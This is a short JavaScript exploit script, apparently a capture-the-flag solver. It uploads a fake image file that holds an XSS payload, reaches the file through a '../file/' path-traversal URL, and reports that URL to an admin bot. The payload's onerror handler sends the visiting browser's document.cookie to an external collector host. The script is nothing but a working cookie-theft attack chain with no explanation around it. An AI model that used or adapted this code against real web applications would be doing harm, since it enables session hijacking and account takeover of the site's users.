const web_url = process.env.WEB_URL || "http://localhost:3000";
const bot_url = process.env.BOT_URL || "http://localhost:1337";
const ext_url = process.env.EXT_URL || "http://localhost:8080";

const res = await fetch(`${web_url}/api/upload`, {
  method: "POST",
  headers: {
    "content-type": "multipart/form-data; boundary=bou",
  },
  body: `--bou
Content-Disposition: form-data; name="file"; filename="a.jpg"

<img src="/a" onerror="fetch('${ext_url}', {method: 'POST', body: document.cookie})">
--bou--`,
});

const data = await res.json();
console.log(`${web_url}/file?file_id=../file/${data.file_id}`);

fetch(`${bot_url}/api/report`, {
  method: "POST",
  headers: {
    "content-type": "application/json",
  },
  body: `{"path":"file?file_id=../file/${data.file_id}"}`,
});
